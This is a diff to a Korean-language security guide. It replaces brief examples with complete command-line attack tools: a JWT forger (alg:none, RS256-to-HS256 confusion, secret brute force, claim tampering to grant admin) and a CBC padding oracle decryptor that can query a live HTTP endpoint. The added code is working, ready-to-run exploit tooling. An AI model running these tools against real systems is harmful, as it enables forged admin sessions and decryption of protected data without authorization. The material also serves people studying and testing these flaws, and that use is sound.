@@ -94,117 +94,224 @@ gpg --list-sigs | grep "SHA1"
 ### JWT 구조 및 알고리즘
 
 ```python
+#!/usr/bin/env python3
+"""
+JWT 분석 및 공격 도구 CLI
+사용: python3 jwt_attacks.py decode  --token <JWT>
+      python3 jwt_attacks.py none    --token <JWT> --claim role=admin
+      python3 jwt_attacks.py brute   --token <JWT> --wordlist rockyou.txt
+      python3 jwt_attacks.py confuse --token <JWT> --pubkey public.pem
+"""
+
+from __future__ import annotations
+import argparse
 import base64
-import json
-import hmac
 import hashlib
-from typing import Optional
+import hmac
+import json
+import sys
+from pathlib import Path
+from typing import Any
 
-def decode_jwt(token: str) -> tuple:
-    """JWT 디코딩 (검증 없이)"""
-    parts = token.split('.')
-    
-    def b64_decode(s: str) -> dict:
-        # Base64url 패딩 추가
-        padding = 4 - len(s) % 4
-        s += '=' * padding
-        return json.loads(base64.urlsafe_b64decode(s))
-    
-    header = b64_decode(parts[0])
-    payload = b64_decode(parts[1])
-    signature = parts[2]
-    
-    return header, payload, signature
 
-def create_jwt(payload: dict, secret: str, algorithm: str = 'HS256') -> str:
-    """JWT 생성"""
-    header = {"alg": algorithm, "typ": "JWT"}
-    
-    def b64_encode(data: dict) -> str:
-        return base64.urlsafe_b64encode(
-            json.dumps(data, separators=(',', ':')).encode()
-        ).rstrip(b'=').decode()
-    
-    header_b64 = b64_encode(header)
-    payload_b64 = b64_encode(payload)
-    
-    message = f"{header_b64}.{payload_b64}"
-    
-    if algorithm == 'HS256':
-        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
-        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
-    elif algorithm == 'none':
-        sig_b64 = ""
-    
-    return f"{message}.{sig_b64}"
+# ── Base64url 유틸 ────────────────────────────────────────────
 
-# ===== JWT 공격 =====
+def b64url_decode(s: str) -> bytes:
+    s += "=" * (-len(s) % 4)
+    return base64.urlsafe_b64decode(s)
 
-def jwt_none_attack(token: str) -> str:
-    """alg:none 공격 - 서명 제거"""
-    parts = token.split('.')
-    header_data = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
-    
-    # 관리자 권한으로 페이로드 변조
-    payload_data['role'] = 'admin'
-    payload_data['admin'] = True
-    
-    # alg를 none으로 변경
-    header_data['alg'] = 'none'
-    
-    new_header = base64.urlsafe_b64encode(
-        json.dumps(header_data).encode()
-    ).rstrip(b'=').decode()
-    
-    new_payload = base64.urlsafe_b64encode(
-        json.dumps(payload_data).encode()
-    ).rstrip(b'=').decode()
-    
-    # 서명 없음
-    return f"{new_header}.{new_payload}."
 
-def jwt_rs256_to_hs256(token: str, public_key: str) -> str:
-    """RS256 → HS256 알고리즘 혼동 공격"""
-    import jwt as pyjwt
-    
-    parts = token.split('.')
-    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
-    
-    # 페이로드 수정
-    payload_data['role'] = 'admin'
-    
-    # RS256의 공개키를 HS256의 비밀키로 사용
-    # 서버가 공개키로 HS256 검증을 시도 → 공격 성공
-    forged_token = pyjwt.encode(
-        payload_data,
-        public_key,
-        algorithm='HS256'
-    )
-    
-    return forged_token
+def b64url_encode(data: bytes | dict) -> str:
+    if isinstance(data, dict):
+        data = json.dumps(data, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
 
-def jwt_brute_force(token: str, wordlist: str) -> Optional[str]:
-    """HMAC 비밀키 브루트포스"""
-    parts = token.split('.')
-    message = f"{parts[0]}.{parts[1]}"
-    signature = base64.urlsafe_b64decode(parts[2] + '==')
-    
-    with open(wordlist, 'r', encoding='latin-1') as f:
-        for line in f:
-            secret = line.strip()
-            
-            test_sig = hmac.new(
-                secret.encode(), 
-                message.encode(), 
-                hashlib.sha256
-            ).digest()
-            
-            if test_sig == signature:
-                print(f"[+] 비밀키 발견: {secret}")
-                return secret
-    
+
+# ── JWT 파싱 ─────────────────────────────────────────────────
+
+def decode_jwt(token: str) -> tuple[dict, dict, str]:
+    """서명 검증 없이 디코딩"""
+    parts = token.split(".")
+    if len(parts) != 3:
+        raise ValueError("유효하지 않은 JWT 형식")
+    header  = json.loads(b64url_decode(parts[0]))
+    payload = json.loads(b64url_decode(parts[1]))
+    return header, payload, parts[2]
+
+
+# ── 공격 1: alg:none ─────────────────────────────────────────
+
+def jwt_none_attack(token: str, extra_claims: dict[str, Any]) -> str:
+    """
+    alg:none 공격 — 서명 제거 후 페이로드 수정
+    취약한 라이브러리는 none 알고리즘 수락
+    """
+    header, payload, _ = decode_jwt(token)
+    header["alg"] = "none"
+    payload.update(extra_claims)
+    msg = f"{b64url_encode(header)}.{b64url_encode(payload)}"
+    return f"{msg}."   # 서명 없음
+
+
+# ── 공격 2: alg 혼동 RS256 → HS256 ──────────────────────────
+
+def jwt_algorithm_confusion(token: str, pubkey_pem: str,
+                             extra_claims: dict[str, Any]) -> str:
+    """
+    RS256 → HS256 알고리즘 혼동 공격
+    서버가 공개키를 HS256 비밀키로 사용해 검증할 때 성공
+
+    pubkey_pem: PEM 형식 RSA 공개키 문자열
+    """
+    _, payload, _ = decode_jwt(token)
+    payload.update(extra_claims)
+
+    header = {"alg": "HS256", "typ": "JWT"}
+    msg    = f"{b64url_encode(header)}.{b64url_encode(payload)}"
+
+    # 공개키 바이트로 HMAC-SHA256 서명
+    key_bytes = pubkey_pem.encode() if isinstance(pubkey_pem, str) else pubkey_pem
+    sig = hmac.new(key_bytes, msg.encode(), hashlib.sha256).digest()
+    return f"{msg}.{b64url_encode(sig)}"
+
+
+# ── 공격 3: HMAC 키 브루트포스 ───────────────────────────────
+
+def jwt_brute_force(token: str, wordlist: Path,
+                    verbose: bool = False) -> str | None:
+    """HS256/HS384/HS512 비밀키 오프라인 브루트포스"""
+    parts = token.split(".")
+    if len(parts) != 3:
+        raise ValueError("유효하지 않은 JWT")
+
+    header = json.loads(b64url_decode(parts[0]))
+    alg    = header.get("alg", "HS256").upper()
+    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
+                "HS512": hashlib.sha512}
+    hash_fn = hash_map.get(alg)
+    if hash_fn is None:
+        print(f"[-] 지원하지 않는 알고리즘: {alg}", file=sys.stderr)
+        return None
+
+    message   = f"{parts[0]}.{parts[1]}".encode()
+    signature = b64url_decode(parts[2])
+
+    try:
+        with wordlist.open("r", encoding="latin-1", errors="replace") as fp:
+            for i, line in enumerate(fp):
+                secret = line.rstrip("\n")
+                if hmac.compare_digest(
+                    hmac.new(secret.encode(), message, hash_fn).digest(),
+                    signature,
+                ):
+                    print(f"[+] 비밀키 발견: {secret!r}  (라인 {i+1})")
+                    return secret
+                if verbose and i % 100_000 == 0:
+                    print(f"    [{i:,}] 시도 중...", end="\r")
+    except OSError as e:
+        print(f"[-] 파일 오류: {e}", file=sys.stderr)
+
+    print("[-] 브루트포스 실패")
     return None
+
+
+# ── 공격 4: 만료 시간 조작 ───────────────────────────────────
+
+def jwt_modify_claims(token: str, claims: dict[str, Any]) -> str:
+    """
+    서명 없이 클레임만 변조 (서버가 서명 검증을 건너뛸 때)
+    실제 공격에선 none 공격과 함께 사용
+    """
+    header, payload, sig = decode_jwt(token)
+    payload.update(claims)
+    return f"{b64url_encode(header)}.{b64url_encode(payload)}.{sig}"
+
+
+# ── CLI ──────────────────────────────────────────────────────
+
+def parse_claims(raw: list[str]) -> dict[str, Any]:
+    """key=value 목록을 dict로 변환. value는 JSON 파싱 시도"""
+    out: dict[str, Any] = {}
+    for kv in raw:
+        k, _, v = kv.partition("=")
+        try:
+            out[k] = json.loads(v)
+        except (json.JSONDecodeError, ValueError):
+            out[k] = v
+    return out
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="JWT 공격 도구")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    # decode
+    p = sub.add_parser("decode", help="JWT 디코딩 (검증 없음)")
+    p.add_argument("--token", required=True)
+
+    # none
+    p = sub.add_parser("none", help="alg:none 공격")
+    p.add_argument("--token",  required=True)
+    p.add_argument("--claim",  nargs="*", default=[], metavar="K=V",
+                   help='예: role=admin "exp=9999999999"')
+
+    # brute
+    p = sub.add_parser("brute", help="HMAC 키 브루트포스")
+    p.add_argument("--token",    required=True)
+    p.add_argument("--wordlist", type=Path, required=True)
+    p.add_argument("--verbose",  action="store_true")
+
+    # confuse
+    p = sub.add_parser("confuse", help="RS256→HS256 알고리즘 혼동")
+    p.add_argument("--token",  required=True)
+    p.add_argument("--pubkey", required=True, help="공개키 PEM 파일")
+    p.add_argument("--claim",  nargs="*", default=[], metavar="K=V")
+
+    # modify
+    p = sub.add_parser("modify", help="클레임 수정 (서명 유지)")
+    p.add_argument("--token",  required=True)
+    p.add_argument("--claim",  nargs="*", default=[], metavar="K=V")
+
+    args = parser.parse_args()
+
+    if args.cmd == "decode":
+        header, payload, sig = decode_jwt(args.token)
+        print("Header :", json.dumps(header,  indent=2, ensure_ascii=False))
+        print("Payload:", json.dumps(payload, indent=2, ensure_ascii=False))
+        print("Sig    :", sig[:32], "..." if len(sig) > 32 else "")
+
+    elif args.cmd == "none":
+        forged = jwt_none_attack(args.token, parse_claims(args.claim))
+        print("[+] 위조된 토큰:")
+        print(forged)
+
+    elif args.cmd == "brute":
+        jwt_brute_force(args.token, args.wordlist, args.verbose)
+
+    elif args.cmd == "confuse":
+        pubkey = Path(args.pubkey).read_text()
+        forged = jwt_algorithm_confusion(
+            args.token, pubkey, parse_claims(args.claim)
+        )
+        print("[+] 위조된 토큰:")
+        print(forged)
+
+    elif args.cmd == "modify":
+        modified = jwt_modify_claims(args.token, parse_claims(args.claim))
+        print("[*] 수정된 토큰 (서명 변경 없음):")
+        print(modified)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        demo = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+        h, p, _ = decode_jwt(demo)
+        print("[Demo] Header :", h)
+        print("[Demo] Payload:", p)
+        print("\n[Demo] alg:none 공격:")
+        print(jwt_none_attack(demo, {"role": "admin"}))
+    else:
+        main()
 ```
 
 ---
@@ -214,79 +321,209 @@ def jwt_brute_force(token: str, wordlist: str) -> Optional[str]:
 ### Padding Oracle 공격
 
 ```python
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+#!/usr/bin/env python3
+"""
+CBC Padding Oracle 공격 PoC + 로컬 시뮬레이션 / HTTP 오라클 지원
+사용: python3 padding_oracle.py local --plaintext "Attack at dawn!!"
+      python3 padding_oracle.py http  --url https://target.com/decrypt \
+                                      --iv IV_HEX --ct CT_HEX
+"""
+
+from __future__ import annotations
+import argparse
+import base64
 import os
+import sys
+from typing import Callable
 
-def padding_oracle_attack(ciphertext: bytes, iv: bytes, 
-                          oracle_function) -> bytes:
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+except ImportError:
+    print("[-] pycryptodome 필요: pip install pycryptodome", file=sys.stderr)
+    sys.exit(1)
+
+BLOCK = 16
+
+
+# ── 패딩 오라클 공격 핵심 ────────────────────────────────────
+
+def padding_oracle_decrypt(
+    ciphertext: bytes,
+    iv: bytes,
+    oracle: Callable[[bytes, bytes], bool],
+    verbose: bool = False,
+) -> bytes:
     """
-    Padding Oracle 공격으로 CBC 복호화
-    oracle_function(iv, ciphertext) → True(올바른 패딩) / False
-    
+    CBC Padding Oracle 공격으로 키 없이 평문 복원
+
     원리:
-    P[i] = D(C[i]) XOR C[i-1]
-    
-    조작된 IV'로 패딩 오라클 이용:
-    D(C[i]) = P'[i] XOR IV'[i]
-    패딩이 올바른 IV'[i]를 찾으면:
-    P[i] = 0x01 XOR IV'[i]
+      P[i] = AES_Dec(C[i]) ⊕ C[i-1]
+      수정된 C'[i-1][j] 를 조작해 AES_Dec(C[i])[j] 를 유도:
+        패딩 값 pad_val 이 성립하는 guess 에서
+        intermediate[j] = guess ⊕ pad_val
+      최종 평문:
+        P[j] = intermediate[j] ⊕ C[i-1][j]
     """
-    
-    block_size = 16
-    plaintext = b""
-    
-    # 각 블록 복호화
-    blocks = [iv] + [ciphertext[i:i+block_size] 
-                     for i in range(0, len(ciphertext), block_size)]
-    
-    for block_idx in range(1, len(blocks)):
-        current_block = blocks[block_idx]
-        prev_block = blocks[block_idx - 1]
-        
-        intermediate = bytearray(block_size)
-        
-        # 각 바이트를 역순으로 복구
-        for byte_pos in range(block_size - 1, -1, -1):
-            padding_value = block_size - byte_pos
-            
-            # 이미 알려진 바이트로 IV' 설정
-            modified_iv = bytearray(block_size)
-            for k in range(byte_pos + 1, block_size):
-                modified_iv[k] = intermediate[k] ^ padding_value
-            
-            # 현재 바이트 브루트포스
-            for guess in range(256):
-                modified_iv[byte_pos] = guess
-                
-                if oracle_function(bytes(modified_iv), current_block):
-                    # 패딩 0x01 발생
-                    intermediate[byte_pos] = guess ^ padding_value
-                    break
-        
-        # 평문 복원
-        plaintext += bytes([i ^ p for i, p in zip(intermediate, prev_block)])
-    
-    # PKCS7 패딩 제거
-    try:
-        return unpad(plaintext, block_size)
-    except:
-        return plaintext
+    blocks = [iv] + [
+        ciphertext[i:i + BLOCK] for i in range(0, len(ciphertext), BLOCK)
+    ]
+    plaintext = bytearray()
 
-# 실제 취약한 웹앱에서의 활용
-def web_padding_oracle(iv: bytes, ciphertext: bytes) -> bool:
-    """실제 웹 앱 패딩 오라클 예시"""
-    import requests
-    
-    import base64
-    token = base64.b64encode(iv + ciphertext).decode()
-    
-    # 취약한 앱이 패딩 오류 시 500, 성공 시 200/302
-    resp = requests.get(
-        f"https://target.com/decrypt?token={token}"
+    for blk_idx in range(1, len(blocks)):
+        curr  = blocks[blk_idx]
+        prev  = blocks[blk_idx - 1]
+        inter = bytearray(BLOCK)   # AES_Dec(curr)
+
+        for byte_pos in range(BLOCK - 1, -1, -1):
+            pad_val = BLOCK - byte_pos
+
+            # 이미 복원된 intermediate 바이트로 뒤쪽 채우기
+            modified = bytearray(BLOCK)
+            for k in range(byte_pos + 1, BLOCK):
+                modified[k] = inter[k] ^ pad_val
+
+            found = False
+            for guess in range(256):
+                modified[byte_pos] = guess
+                if oracle(bytes(modified), curr):
+                    # 0x01 패딩이 성립 → intermediate[byte_pos] 확정
+                    inter[byte_pos] = guess ^ pad_val
+                    found = True
+                    break
+
+            if not found:
+                raise RuntimeError(
+                    f"오라클 응답 없음: 블록{blk_idx} 바이트{byte_pos}"
+                )
+
+        block_plain = bytes(i ^ p for i, p in zip(inter, prev))
+        plaintext.extend(block_plain)
+        if verbose:
+            print(f"  블록 {blk_idx:02d}: {block_plain.hex()}  "
+                  f"({block_plain!r})")
+
+    try:
+        return bytes(unpad(plaintext, BLOCK))
+    except ValueError:
+        return bytes(plaintext)
+
+
+# ── 로컬 오라클 (데모용) ────────────────────────────────────
+
+class LocalOracle:
+    """서버 역할: 올바른 PKCS7 패딩이면 True"""
+    def __init__(self) -> None:
+        self.key = os.urandom(16)
+        self._calls = 0
+
+    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
+        iv = os.urandom(BLOCK)
+        ct = AES.new(self.key, AES.MODE_CBC, iv).encrypt(pad(plaintext, BLOCK))
+        return iv, ct
+
+    def __call__(self, iv: bytes, ciphertext: bytes) -> bool:
+        self._calls += 1
+        try:
+            unpad(
+                AES.new(self.key, AES.MODE_CBC, iv).decrypt(ciphertext),
+                BLOCK,
+            )
+            return True
+        except (ValueError, KeyError):
+            return False
+
+
+# ── HTTP 오라클 ─────────────────────────────────────────────
+
+def make_http_oracle(
+    url: str,
+    param: str = "token",
+    success_codes: tuple[int, ...] = (200, 302),
+) -> Callable[[bytes, bytes], bool]:
+    """실제 웹 앱의 패딩 오라클을 HTTP 요청으로 감지"""
+    try:
+        import requests
+    except ImportError:
+        print("[-] requests 필요: pip install requests", file=sys.stderr)
+        sys.exit(1)
+
+    session = requests.Session()
+
+    def oracle(iv: bytes, ct: bytes) -> bool:
+        token = base64.b64encode(iv + ct).decode()
+        try:
+            r = session.get(url, params={param: token}, timeout=10)
+            return r.status_code in success_codes
+        except requests.RequestException:
+            return False
+
+    return oracle
+
+
+# ── CLI ──────────────────────────────────────────────────────
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="CBC Padding Oracle 공격 PoC"
     )
-    
-    return resp.status_code != 500  # 500이 아니면 올바른 패딩
+    sub = parser.add_subparsers(dest="mode", required=True)
+
+    # 로컬 시뮬레이션
+    lp = sub.add_parser("local", help="로컬 오라클 시뮬레이션")
+    lp.add_argument("--plaintext", default="Attack at dawn!!", help="암호화할 평문")
+    lp.add_argument("--verbose", action="store_true")
+
+    # HTTP 오라클
+    hp = sub.add_parser("http", help="원격 HTTP 오라클 공격")
+    hp.add_argument("--url",    required=True, help="취약한 앱 URL")
+    hp.add_argument("--iv",     required=True, help="IV (hex)")
+    hp.add_argument("--ct",     required=True, help="암호문 (hex)")
+    hp.add_argument("--param",  default="token", help="GET 파라미터명")
+    hp.add_argument("--success-codes", nargs="+", type=int,
+                    default=[200, 302], help="패딩 성공으로 판단할 HTTP 코드")
+    hp.add_argument("--verbose", action="store_true")
+
+    args = parser.parse_args()
+
+    if args.mode == "local":
+        oracle = LocalOracle()
+        pt_bytes = args.plaintext.encode()
+        iv, ct = oracle.encrypt(pt_bytes)
+        print(f"[*] 암호화 완료  IV={iv.hex()}  CT={ct.hex()}")
+        print(f"[*] 패딩 오라클 공격 시작...")
+
+        recovered = padding_oracle_decrypt(ct, iv, oracle, args.verbose)
+        print(f"\n[+] 복원된 평문: {recovered!r}")
+        print(f"[*] 오라클 호출 횟수: {oracle._calls}")
+        assert recovered == pt_bytes, "복원 실패"
+        print("[+] 검증 성공!")
+
+    elif args.mode == "http":
+        iv = bytes.fromhex(args.iv)
+        ct = bytes.fromhex(args.ct)
+        oracle = make_http_oracle(
+            args.url, args.param,
+            tuple(args.success_codes),
+        )
+        print(f"[*] HTTP 패딩 오라클 공격: {args.url}")
+        recovered = padding_oracle_decrypt(ct, iv, oracle, args.verbose)
+        print(f"\n[+] 복원된 평문 (hex): {recovered.hex()}")
+        try:
+            print(f"[+] 복원된 평문 (text): {recovered.decode()}")
+        except UnicodeDecodeError:
+            pass
+
+
+if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        # 빠른 데모
+        oracle = LocalOracle()
+        iv, ct = oracle.encrypt(b"Sensitive data!!")
+        result = padding_oracle_decrypt(ct, iv, oracle)
+        print(f"[Demo] 복원: {result!r}  호출: {oracle._calls}")
+    else:
+        main()
 ```
 
 ### ECDSA 논스 재사용 공격
